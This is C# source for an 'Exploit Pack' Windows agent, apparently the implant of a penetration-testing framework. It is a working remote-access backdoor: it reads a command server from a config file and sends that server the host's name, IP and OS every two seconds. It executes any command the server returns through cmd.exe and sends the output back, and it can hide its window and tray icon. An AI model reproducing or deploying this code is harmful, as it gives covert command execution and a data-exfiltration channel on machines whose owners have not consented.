using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;




namespace WindowsFormsApp1
{

    public partial class Form1 : Form
    {
        string agentUN = "jsacco";
        string sLine = "";
        public Form1()
        {
            InitializeComponent();
            this.CenterToScreen();

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        [Obsolete]
        private void button1_Click(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            TimerCallback tmCallback = CheckEffectExpiry;
            System.Threading.Timer timer = new System.Threading.Timer(tmCallback, "Magic", 2000, 2000);
        }

        [Obsolete]
        public void CheckEffectExpiry(object objectInfo)
        {
            SendMagic(getComputerName(), getLocalIPAddress(), "Internet Explorer", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
            if (sLine != null)
            {
                statusLog.AppendText("["+DateTime.Now.ToString("hh:mm:ss tt")+"]"+ " - Waiting for Exploit Pack..\n");

                statusLog.AppendText("[" + DateTime.Now.ToString("hh:mm:ss tt") + "]" + " - Command received: " +sLine + "\n");
                if (sLine.StartsWith("OS="))
                {
                    string switcher = sLine.Replace("OS=", "").Trim();
                    if (!String.IsNullOrEmpty(switcher))
                    {
                        switcher = switcher.Replace("*_*", "");
                        switch (switcher)
                        {
                            case "?":
                                Console.WriteLine("?");
                                break;
                            case "Screenshot":
                                statusLog.AppendText("TBD");
                                break;

                            default:
                                statusLog.AppendText("\nCommand executed: "+RunCMD(switcher)+"\n");
                                break;
                        }
                    }
                }
                statusLog.ScrollToCaret();
            }
        }

        [Obsolete]
        public void SendMagic(string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP)
        {
            try
            {
                string sURL;
                string args;

                sURL = "http://" + serverAddress.Text + ":" + serverPort.Text + "/agent/&";
                WebRequest wrGETURL;
                args = Base64StringEncode(CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress());

                wrGETURL = WebRequest.Create(sURL + args);
                wrGETURL.Proxy = WebProxy.GetDefaultProxy();
                Stream objStream;

                objStream = wrGETURL.GetResponse().GetResponseStream();
                StreamReader objReader = new StreamReader(objStream);

                sLine = objReader.ReadLine();
            }
            catch (System.Net.WebException exception)
            {
               // Do nothing with this exception <- Retry connection
            }
        }

        [Obsolete]
        public string RunCMD(string cmd)
        {
            statusLog.AppendText(cmd);

            string output = RunCommandCMD(cmd);
            if (!String.IsNullOrEmpty(output)) {
                SendMagic(getComputerName(), getLocalIPAddress(), "Internet Explorer", GetOSFriendlyName(), output, agentUN, getLocalIPAddress());
            }
            SendMagic(getComputerName(), getLocalIPAddress(), "Internet Explorer", GetOSFriendlyName(), "Command executed", agentUN, getLocalIPAddress());

            return output;
        }

        

        public string Base64StringEncode(string originalString)
        {
            var bytes = Encoding.UTF8.GetBytes(originalString);
            var encodedString = Convert.ToBase64String(bytes);
            return encodedString;
        }

        public static string GetOSFriendlyName()
        {
            string result = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
            foreach (ManagementObject os in searcher.Get())
            {
                result = os["Caption"].ToString();
                break;
            }
            return result;
        }

        public string getLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "127.0.0.1";
        }

        public string getComputerName()
        {
            return Environment.MachineName.ToString();
        }

        public string RunCommandCMD(string cmd)
        {
            // Start the child process.
            Process p = new Process();
            // Redirect the output stream of the child process.
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();
            // Read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            Console.WriteLine(output);
            return output;
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
            notifyIcon1.BalloonTipText = "Agent is running";
            notifyIcon1.BalloonTipTitle = "Exploit Pack";
            notifyIcon1.ShowBalloonTip(1000);
            if (File.Exists("config.ep"))
            {
                string FileToRead = @"config.ep";
                // Creating string array  
                string[] lines = File.ReadAllLines(FileToRead);
                serverAddress.Text = lines[0];
                serverPort.Text = lines[1];

                if (lines[1] != null) {
                    button1.PerformClick();
                }
            }
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void contextMenuStrip1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            openFileDialog1.Title = "Browse config file";
            openFileDialog1.DefaultExt = "ep";
        }

        private void hideAgentToolStripMenuItem_Click(object sender, EventArgs e)
        {
            notifyIcon1.Visible = false;
            this.Hide();
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void openConfigToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                openFileDialog1.ShowDialog();
                openFileDialog1.Title = "Browse config file";
                openFileDialog1.DefaultExt = "ep";
                ExploitPack.Editor editor = new ExploitPack.Editor(openFileDialog1.FileName);
                editor.Show();
            }
            catch { 
                // Don't
            }

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked) {

            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            notifyIcon1.Visible = false;
            this.Hide();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExploitPack.About about = new ExploitPack.About();
            about.Show();
        }
    }
}

